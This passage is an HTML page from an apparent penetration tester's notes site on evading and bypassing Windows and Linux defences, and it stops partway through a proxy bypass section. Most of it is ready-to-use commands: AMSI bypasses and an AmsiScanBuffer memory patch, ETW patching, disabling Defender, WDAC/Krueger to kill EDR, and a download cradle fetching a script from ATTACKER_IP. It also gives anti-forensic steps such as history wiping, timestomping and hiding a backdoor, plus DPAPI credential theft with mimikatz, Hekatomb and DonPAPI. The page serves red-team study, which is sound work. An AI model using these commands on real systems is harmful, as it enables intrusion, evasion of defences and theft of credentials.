@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Evasion &amp; Bypass — Corey Clay</title>
+<meta name="description" content="Evasion and bypass reference — EDR static/behavioural detection, AMSI bypass, Windows Defender disable, AppLocker and UAC bypass, WDAC kill, DPAPI, PowerShell CLM, proxy bypass, and payload obfuscation.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ other / evasion & bypass</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a class="here" href="other.html" aria-current="page">other</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="other.html">&lsaquo; other</a> &nbsp;/&nbsp; // stay-off-the-radar</p>
+  <h1>Evasion &amp; Bypass</h1>
+  <p>Getting past the defences that stand between a payload and execution — EDR hooks (unhooking, indirect syscalls, call-stack spoofing), AMSI and ETW patching, Windows Defender disable, AppLocker and UAC bypass, WDAC + Krueger to kill EDR, Linux evasion (history, timestomping, hidepid), DPAPI credential recovery, PowerShell CLM bypass, proxy bypass, and the on-disk vs in-memory evasion trade-offs.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#endpoint-detection-and-response-edr-bypass">Endpoint Detection and Response (EDR) Bypass</a>
+      <a href="#elastic-edr">Elastic EDR</a>
+      <a href="#linux-evasion">Linux Evasion</a>
+      <a href="#windows-amsi-bypass">Windows AMSI Bypass</a>
+      <a href="#windows-defender-disabling">Windows Defender Disabling</a>
+      <a href="#windows-defenses">Windows Defenses</a>
+      <a href="#windows-dpapi">Windows DPAPI</a>
+      <a href="#proxy-bypass">Proxy Bypass</a>
+      <a href="#powershell-evasion">PowerShell Evasion</a>
+      <a href="#windows-defender-application-control-wdac">Windows Defender Application Control (WDAC)</a>
+      <a href="#av-evasion-shellter">AV Evasion -- Shellter</a>
+      <a href="#powershell-obfuscation-invoke-obfuscation">PowerShell Obfuscation -- Invoke-Obfuscation</a>
+      <a href="#cross-compiling-exploits">Cross-Compiling Exploits</a>
+      <a href="#av-detection-methods-background">AV Detection Methods — Background</a>
+      <a href="#on-disk-evasion-techniques">On-Disk Evasion Techniques</a>
+      <a href="#in-memory-evasion-fileless">In-Memory Evasion (Fileless)</a>
+      <a href="#exploit-coding-shellcode-notes">Exploit-Coding / Shellcode Notes</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<h2 id="endpoint-detection-and-response-edr-bypass">Endpoint Detection and Response (EDR) Bypass</h2>
+<h3>Static Detection</h3>
+<p><strong>Mechanism</strong>: Static detection analyzes files and applications without executing them, based on predefined signatures or known malicious patterns.</p>
+<p><strong>Bypass Techniques</strong>:</p>
+<ul>
+<li>Obfuscate strings</li>
+<li>Dynamically resolving strings</li>
+<li>Dynamically resolving imports, reducing the Import Address Table (IAT)</li>
+<li>Custom <code>GetProcAddress</code> and <code>GetModuleHandle</code></li>
+<li>API Hashing</li>
+</ul>
+<h3>User Behavioral Analysis</h3>
+<p><strong>Mechanism</strong>: Monitors and analyzes user activities and patterns to detect anomalies.</p>
+<p><strong>Bypass</strong>: Learning about OPSEC methods.</p>
+<h3>Usermode Windows Function Monitoring</h3>
+<p><strong>Mechanism</strong>: Tracks and analyzes the execution of Windows API calls within user space processes.</p>
+<p><strong>Bypass</strong>:</p>
+<ul>
+<li>Unhooking</li>
+<li>Indirect syscalls</li>
+</ul>
+<h3>Call Stack Analysis</h3>
+<p><strong>Mechanism</strong>: Checking the origin of function calls via the Call Stack chain.</p>
+<p><strong>Bypass</strong>: (See references for latest techniques)</p>
+<h3>Process Analysis</h3>
+<p><strong>Mechanism</strong>: Inspecting memory regions, identifying remote process access, and assessing child processes.</p>
+<p><strong>Bypass</strong>:</p>
+<ul>
+<li>Avoid RWX memory region (use RW-&gt;RX instead)</li>
+<li>Break parent-child link (e.g., word.exe spawning cmd.exe)</li>
+</ul>
+<h3>Kernel Callbacks</h3>
+<p><strong>Mechanism</strong>: Functions registered by kernel drivers triggered in response to specific kernel events.</p>
+<p><strong>Bypass</strong>: (See kernel evasion techniques)</p>
+<h3>WDAC to Disable EDR Components</h3>
+<p>Place the WDAC policy <code>SiPolicy.p7b</code> inside <code>C:\Windows\System32\CodeIntegrity\</code> and reboot the machine.</p>
+<pre><code class="language-powershell">smbmap -u &lt;USER&gt; -p '&lt;PASSWORD&gt;' -H &lt;TARGET_IP&gt; --upload &quot;/home/kali/SiPolicy.p7b&quot; &quot;ADMIN\$/System32/CodeIntegrity/SiPolicy.p7b&quot;
+smbmap -u &lt;USER&gt; -p '&lt;PASSWORD&gt;' -H &lt;TARGET_IP&gt; -x &quot;shutdown /r /t 0&quot;
+</code></pre>
+<p>Using Krueger (a .NET post-exploitation tool):</p>
+<pre><code class="language-powershell">inlineExecute-Assembly --dotnetassembly C:\Tools\Krueger.exe --assemblyargs --host &lt;TARGET_HOST&gt;
+</code></pre>
+<p><strong>Resources</strong>:</p>
+<ul>
+<li><a href="https://github.com/logangoins/Krueger">logangoins/Krueger</a> - Weaponizing WDAC for killing EDR</li>
+</ul>
+<hr />
+<h2 id="elastic-edr">Elastic EDR</h2>
+<p>Elastic EDR is a component of Elastic Security designed to address cybersecurity threats at the endpoint level. It prevents, detects, and responds to cyber threats like ransomware and malware.</p>
+<h3>Setup</h3>
+<p>Requires Docker and Docker Compose:</p>
+<pre><code class="language-bash">## Install Docker
+sudo apt-get update
+sudo apt-get install ca-certificates curl
+sudo install -m 0755 -d /etc/apt/keyrings
+sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+sudo chmod a+r /etc/apt/keyrings/docker.asc
+
+echo \
+  &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
+  $(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;) stable&quot; | \
+  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+sudo apt-get update
+sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+
+## Grant docker rights to user
+sudo groupadd docker
+sudo usermod -aG docker $USER
+</code></pre>
+<p><strong>Install requirements</strong>:</p>
+<pre><code class="language-bash">apt-get update
+apt-get install jq git curl
+git clone https://github.com/peasead/elastic-container
+cd elastic-container
+</code></pre>
+<p><strong>Configure .env</strong>:</p>
+<pre><code class="language-bash">ELASTIC_PASSWORD=&quot;changeme&quot;
+KIBANA_PASSWORD=&quot;changeme&quot;
+STACK_VERSION=&quot;8.11.2&quot;
+WindowsDR=1
+LICENSE=trial  # Enable platinum features
+</code></pre>
+<p><strong>Deploy</strong>:</p>
+<pre><code class="language-bash">chmod +x ./elastic-container.sh
+./elastic-container.sh start
+</code></pre>
+<p>Access at <code>https://localhost:5601</code></p>
+<p><strong>Enroll agents</strong>:</p>
+<ul>
+<li>Fleet &gt; Add agent</li>
+<li>Copy Windows PowerShell one-liner, append <code>--insecure</code> flag if using untrusted certificates</li>
+</ul>
+<pre><code class="language-powershell">powershell Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-7.15.1-windows-x86_64.zip -outfile elastic-agent-7.15.1-windows-x86_64.zip
+Expand-Archive -Path elastic-agent-7.15.1-windows-x86_64.zip -DestinationPath C:\ElasticAgent
+C:\ElasticAgent\elastic-agent-7.15.1-windows-x86_64\elastic-agent.exe install -f --fleet-server-es={{ fleet_server_es }} --fleet-server-service-token={{ fleet_token }} --fleet-server-policy={{ fleet_policy }}
+</code></pre>
+<p><strong>Enable detection</strong>:</p>
+<ul>
+<li>Fleet &gt; Integrations &gt; Elastic Defend</li>
+<li>Switch <code>Prevent</code> to <code>Detect</code> to keep execution running</li>
+<li>Enable advanced features:</li>
+</ul>
+<pre><code class="language-powershell">windows.advanced.memory_protection.shellcode_collect_sample
+windows.advanced.memory_protection.memory_scan_collect_sample
+windows.advanced.memory_protection.shellcode_enhanced_pe_parsing
+</code></pre>
+<p><strong>Cleanup</strong>:</p>
+<pre><code class="language-bash">./elastic-container.sh destroy
+</code></pre>
+<hr />
+<h2 id="linux-evasion">Linux Evasion</h2>
+<h3>File Names</h3>
+<p>Use Unicode zero-width space to create visually indistinguishable filenames:</p>
+<pre><code class="language-bash">## Decoy file with no special characters
+touch 'index.php'
+
+## Imposter file with identical appearance
+touch $'index‍.php'
+</code></pre>
+<h3>Command History</h3>
+<p><strong>Prevent writing to history</strong>:</p>
+<pre><code class="language-bash">unset HISTFILE
+export HISTSIZE=0
+</code></pre>
+<p><strong>Exclude commands matching patterns</strong> (by default ignores leading whitespace):</p>
+<pre><code class="language-bash"> my-sneaky-command
+</code></pre>
+<p><strong>Remove individual entries</strong>:</p>
+<pre><code class="language-bash">## Removes the most recently logged command (delete two entries to avoid logging the delete command itself)
+history -d -2 &amp;&amp; history -d -1
+</code></pre>
+<p><strong>Clear all history</strong>:</p>
+<pre><code class="language-bash">history -c &amp;&amp; history -w
+</code></pre>
+<p><strong>Permanently disable bash history</strong>:</p>
+<pre><code class="language-bash">ln /dev/null ~/.bash_history -sf
+echo &quot;&quot; &gt; ~/.bash_history
+</code></pre>
+<h3>Hiding Text with ANSI Escape Sequences</h3>
+<p>Hide text under certain circumstances using ANSI escape sequences:</p>
+<pre><code class="language-bash">echo &quot;sneaky-payload-command&quot; &gt; script.sh
+echo &quot;# $(clear)&quot; &gt;&gt; script.sh
+echo &quot;# Do not remove. Generated from /etc/issue.conf by configure.&quot; &gt;&gt; script.sh
+
+## When printed, terminal clears and only the last line is visible
+cat script.sh
+</code></pre>
+<h3>Timestomping</h3>
+<p>Alter file timestamps to conceal modification:</p>
+<pre><code class="language-bash">## Change access and modification times using YYYYMMDDhhmm format
+touch -a -m -t 202210312359 &quot;example&quot;
+
+## Change using Unix epoch timestamp
+touch -a -m -d @1667275140 &quot;example&quot;
+
+## Copy timestamp from another file
+touch -a -m -r &quot;other_file&quot; &quot;example&quot;
+
+## Modify file while preserving timestamp
+MODIFIED_TS=$(stat --format=&quot;%Y&quot; &quot;example&quot;)
+echo &quot;backdoor&quot; &gt;&gt; &quot;example&quot;
+touch -a -m -d @$MODIFIED_TS &quot;example&quot;
+</code></pre>
+<p><strong>Note</strong>: <code>touch</code> can only modify access and modification times, not change or birth timestamps.</p>
+<p><strong>Workaround for root</strong> (modify system clock, create file, revert clock):</p>
+<pre><code class="language-bash">ORIG_TIME=$(date)
+date -s &quot;2022-10-31 23:59:59&quot;
+touch -a -m &quot;example&quot;
+date -s &quot;${ORIG_TIME}&quot;
+</code></pre>
+<p>Remember: creating a file also updates the parent directory's modification timestamp!</p>
+<h3>Hiding PID Listings from Non-Root Users</h3>
+<p>Limit access to process information by modifying <code>/proc</code> mount options:</p>
+<pre><code class="language-bash">sudo mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 /proc
+</code></pre>
+<ul>
+<li><code>hidepid=2</code>: Hides all processes that don't belong to the user</li>
+<li><code>hidepid=1</code>: Hides only process details but still shows PIDs</li>
+</ul>
+<hr />
+<h2 id="windows-amsi-bypass">Windows AMSI Bypass</h2>
+<h3>AMSI Overview</h3>
+<p>The Anti-Malware Scan Interface (AMSI) provides a unified interface for applications to integrate with anti-malware products. It allows runtime scanning of files and scripts, providing a means for applications to request scans of specific content.</p>
+<h3>Quick Bypass</h3>
+<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+</code></pre>
+<h3>AMSI Bypass Techniques</h3>
+<p><strong>String Obfuscation</strong>:</p>
+<pre><code class="language-powershell">## Bypass using string concatenation
+'Ams' + 'iUtils'
+</code></pre>
+<p><strong>AmsiScanBuffer Patching (rasta-mouse)</strong>:</p>
+<pre><code class="language-powershell">$Win32 = @&quot;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name);
+    [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+&quot;@
+Add-Type $Win32
+$LoadLibrary = [Win32]::LoadLibrary(&quot;am&quot; + &quot;si.dll&quot;)
+$Address = [Win32]::GetProcAddress($LoadLibrary, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;)
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+</code></pre>
+<p><strong>Matt Graeber's Reflection Method</strong>:</p>
+<pre><code class="language-powershell">[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x41414141)
+</code></pre>
+<p><strong>List AMSI Providers</strong>:</p>
+<pre><code class="language-powershell">Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\'
+</code></pre>
+<p><strong>Constrained Language Mode bypass</strong>:</p>
+<p>Use PowerShell v2 (older versions don't support CLM):</p>
+<pre><code class="language-powershell">powershell.exe -version 2
+powershell.exe -version 2 -ExecutionPolicy bypass
+powershell.exe -v 2 -ep bypass -command &quot;IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')&quot;
+</code></pre>
+<p><strong>ETW Patching</strong>:</p>
+<p>Patch <code>EtwEventWrite</code> to disable Event Tracing for Windows:</p>
+<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+</code></pre>
+<hr />
+<h2 id="windows-defender-disabling">Windows Defender Disabling</h2>
+<h3>Disable Real-Time Monitoring via PowerShell</h3>
+<p>When you have admin or SYSTEM privileges, you can disable Windows Defender protection:</p>
+<pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+</code></pre>
+<hr />
+<h2 id="windows-defenses">Windows Defenses</h2>
+<h3>AppLocker</h3>
+<p>AppLocker is a security feature providing administrators control over which applications users are allowed to run.</p>
+<p><strong>Enumerate Effective Policy</strong>:</p>
+<pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+Get-AppLockerPolicy -effective -xml
+Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
+</code></pre>
+<p><strong>AppLocker Bypass</strong>:</p>
+<ul>
+<li>By default, <code>C:\Windows</code> is not blocked, and <code>C:\Windows\Tasks</code> is writable by any users</li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">api0cradle/UltimateAppLockerByPassList</a> for comprehensive bypass techniques</li>
+</ul>
+<h3>User Account Control (UAC)</h3>
+<p>UAC is a security feature that asks for permission or an administrator's password before allowing changes.</p>
+<p><strong>Check UAC Status</strong>:</p>
+<pre><code class="language-powershell">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+</code></pre>
+<p><strong>Check UAC Level</strong>:</p>
+<pre><code class="language-powershell">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
+</code></pre>
+<p><strong>UAC Bypass Techniques</strong>:</p>
+<ul>
+<li>Use auto-elevated binaries signed by Microsoft (<code>msconfig</code>, <code>sdclt.exe</code>, <code>eventvwr.exe</code>)</li>
+<li><a href="https://github.com/hfiref0x/UACME">hfiref0x/UACME</a> - Defeating Windows UAC</li>
+</ul>
+<hr />
+<h2 id="windows-dpapi">Windows DPAPI</h2>
+<p>On Windows, credentials saved in the Windows Credentials Manager are encrypted using DPAPI and stored as "blob" files in user AppData folder.</p>
+<h3>Context</h3>
+<ul>
+<li><strong>Outside domain</strong>: User's password hash encrypts the blobs</li>
+<li><strong>Inside domain</strong>: Domain controller's master key encrypts the blobs</li>
+</ul>
+<h3>List Credential Files</h3>
+<pre><code class="language-powershell">vaultcmd /list
+vaultcmd /listcreds:&quot;Windows Credentials&quot; /all
+
+dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+</code></pre>
+<h3>DPAPI LocalMachine Context</h3>
+<p>The LocalMachine context protects data shared across users/services on a single machine:</p>
+<pre><code class="language-powershell">$a = [System.Convert]::FromBase64String(&quot;AQAAANCMnd[...]&quot;)
+$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+[System.Text.Encoding]::ASCII.GetString($b)
+</code></pre>
+<h3>Mimikatz with DPAPI</h3>
+<pre><code class="language-powershell">## Check credentials folder
+dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
+
+## Check specific credential file
+mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+
+## Find master key
+mimikatz !sekurlsa::dpapi
+
+## Use master key to decrypt
+mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+
+## Find and export backup keys
+lsadump::backupkeys /system:dc01.lab.local /export
+
+## Use backup keys
+dpapi::masterkey /in:&quot;C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe&quot; /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
+</code></pre>
+<h3>Hekatomb</h3>
+<p>Automatically retrieve all computers and users from LDAP, download all DPAPI blobs, extract domain controller private key via RPC, and decrypt all credentials:</p>
+<pre><code class="language-bash">pip3 install hekatomb
+hekatomb -hashes :&lt;NTHASH&gt; &lt;DOMAIN&gt;/administrator@&lt;DC_IP&gt; -debug -dnstcp
+</code></pre>
+<h3>DonPAPI</h3>
+<pre><code class="language-bash">DonPAPI.py domain/user:passw0rd@target
+DonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain/user@target
+
+## Using domain backup key
+dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
+python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
+</code></pre>
+<hr />
+<h2 id="proxy-bypass">Proxy Bypass</h2>
+<h3>Discover Proxy Configuration</h3>
+<p><strong>Windows Registry</strong>:</p>
+<pre><code class="language-powershell">Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\DefaultConnectionSettings
+Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer
+</code></pre>
+<p><strong>Windows Command Line</strong>:</p>
